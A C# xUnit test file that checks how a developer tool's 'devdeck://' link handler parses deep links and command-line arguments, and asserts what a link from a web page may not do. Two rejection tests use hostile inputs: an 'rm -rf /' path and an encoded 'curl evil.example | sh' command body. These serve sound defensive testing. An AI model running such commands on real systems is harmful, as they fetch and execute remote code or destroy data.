using DevDeck.Core;
using Xunit;

namespace DevDeck.Core.Tests
{
    /// <summary>
    ///  What a link is allowed to ask for.
    /// </summary>
    /// <remarks>
    ///  Worth testing carefully because this is reachable from a web page: a scheme handler is the
    ///  one part of the app a stranger can address. Most of what is asserted here is therefore what
    ///  a link cannot do, rather than what it can.
    /// </remarks>
    public sealed class DeepLinkTests
    {
        [Fact]
        public void APlainRunLinkNamesItsCommand()
        {
            LinkRequest request = DeepLink.Parse("devdeck://run/Build");

            Assert.Equal("Run", request.Intent.ToString());
            Assert.Equal("Build", request.Target);
        }

        [Fact]
        public void ASpaceInTheNameSurvivesTheRoundTrip()
        {
            string link = DeepLink.For(Intent.Run, "Publish all");

            Assert.Equal("Publish all", DeepLink.Parse(link).Target);
        }

        [Theory]
        [InlineData("devdeck://run/Build")]
        [InlineData("DEVDECK://run/Build")]
        [InlineData("  devdeck://run/Build  ")]
        [InlineData("devdeck://run/Build/")]
        public void TheShapeIsForgiving(string link) =>
            Assert.Equal("Build", DeepLink.Parse(link).Target);

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        [InlineData("https://example.com/run/Build")]
        [InlineData("run/Build")]
        [InlineData("devdeck://explode/rm -rf /")]
        public void AnythingElseIsNotARequest(string? link) =>
            Assert.False(DeepLink.Parse(link).IsSomething);

        /// <summary>
        ///  The security boundary, stated as a test.
        /// </summary>
        /// <remarks>
        ///  A link may only name a command the user has already saved. If a verb ever appears that
        ///  carries a body to run, this test is where that decision has to be argued with.
        /// </remarks>
        [Fact]
        public void ALinkCannotSupplyACommandBody()
        {
            LinkRequest request = DeepLink.Parse("devdeck://exec/curl%20evil.example%20%7C%20sh");

            Assert.False(request.IsSomething);
        }

        [Theory]
        [InlineData("devdeck://run")]
        [InlineData("devdeck://run/")]
        [InlineData("devdeck://chain/")]
        [InlineData("devdeck://open/")]
        public void AVerbWithNothingToActOnIsRefused(string link) =>
            Assert.False(DeepLink.Parse(link).IsSomething);

        [Fact]
        public void ABareSectionNameShowsThatSection()
        {
            LinkRequest request = DeepLink.Parse("devdeck://Commands");

            Assert.Equal("Show", request.Intent.ToString());
            Assert.Equal("Commands", request.Target);
        }

        [Fact]
        public void ABareLinkJustShowsTheWindow()
        {
            LinkRequest request = DeepLink.Parse("devdeck://show");

            Assert.Equal("Show", request.Intent.ToString());
            Assert.Equal(string.Empty, request.Target);
        }

        [Fact]
        public void ValuesComeThroughTheQuery()
        {
            LinkRequest request = DeepLink.Parse("devdeck://run/Checkout?branch=main&remote=origin");

            Assert.Equal("main", request.Values["branch"]);
            Assert.Equal("origin", request.Values["remote"]);
        }

        [Fact]
        public void AValueMayContainASlash()
        {
            LinkRequest request = DeepLink.Parse("devdeck://run/Checkout?branch=feature%2Flogin");

            Assert.Equal("feature/login", request.Values["branch"]);
        }

        /// <remarks>
        ///  A name is matched case-insensitively later on, so a value looked up by a different
        ///  spelling of its own key would be a surprise nobody would find.
        /// </remarks>
        [Fact]
        public void ValueNamesDoNotCareAboutCase()
        {
            LinkRequest request = DeepLink.Parse("devdeck://run/Checkout?Branch=main");

            Assert.Equal("main", request.Values["branch"]);
        }

        [Fact]
        public void AMalformedEscapeIsTextRatherThanAFailure()
        {
            LinkRequest request = DeepLink.Parse("devdeck://run/100%25%20coverage");

            Assert.True(request.IsSomething);
        }

        [Fact]
        public void AQuestionMarkInTheNameDoesNotBecomeAQuery()
        {
            string link = DeepLink.For(Intent.Run, "Ready?");

            LinkRequest request = DeepLink.Parse(link);

            Assert.Equal("Ready?", request.Target);
            Assert.Empty(request.Values);
        }

        [Fact]
        public void ArgumentsParseTheSameWayAsALink()
        {
            LinkRequest request = DeepLink.FromArguments(["run", "Build"]);

            Assert.Equal("Run", request.Intent.ToString());
            Assert.Equal("Build", request.Target);
        }

        [Fact]
        public void ArgumentsCarryValuesAsPairs()
        {
            LinkRequest request = DeepLink.FromArguments(["run", "Checkout", "branch=main"]);

            Assert.Equal("main", request.Values["branch"]);
        }

        /// <remarks>
        ///  A branch called <c>fix=typo</c> is unusual but legal, and splitting on the last equals
        ///  sign instead of the first would mangle it.
        /// </remarks>
        [Fact]
        public void OnlyTheFirstEqualsSignSeparatesAPair()
        {
            LinkRequest request = DeepLink.FromArguments(["run", "Checkout", "branch=fix=typo"]);

            Assert.Equal("fix=typo", request.Values["branch"]);
        }

        [Fact]
        public void ALinkHandedOverAsASingleArgumentIsStillALink()
        {
            LinkRequest request = DeepLink.FromArguments(["devdeck://run/Build"]);

            Assert.Equal("Build", request.Target);
        }

        [Theory]
        [InlineData("--run")]
        [InlineData("run")]
        public void TheDashesAreOptional(string verb) =>
            Assert.Equal("Build", DeepLink.FromArguments([verb, "Build"]).Target);

        [Theory]
        [InlineData("")]
        [InlineData("--help")]
        [InlineData("nonsense")]
        public void AnUnknownArgumentIsNotARequest(string verb) =>
            Assert.False(DeepLink.FromArguments([verb]).IsSomething);

        [Fact]
        public void NoArgumentsIsNotARequest() =>
            Assert.False(DeepLink.FromArguments([]).IsSomething);

        [Fact]
        public void AChainLinkSaysSo()
        {
            LinkRequest request = DeepLink.Parse("devdeck://chain/Ship");

            Assert.Equal("Chain", request.Intent.ToString());
            Assert.Equal("Ship", request.Target);
        }

        [Theory]
        [InlineData("devdeck://open/C:%5Cwork%5Capi")]
        [InlineData("devdeck://workspace/C:%5Cwork%5Capi")]
        public void BothSpellingsOpenAFolder(string link)
        {
            LinkRequest request = DeepLink.Parse(link);

            Assert.Equal("Workspace", request.Intent.ToString());
            Assert.Equal(@"C:\work\api", request.Target);
        }

        [Fact]
        public void TheDescriptionNamesWhatWillHappen() =>
            Assert.Contains("Build", DeepLink.Parse("devdeck://run/Build").Describe());
    }
}
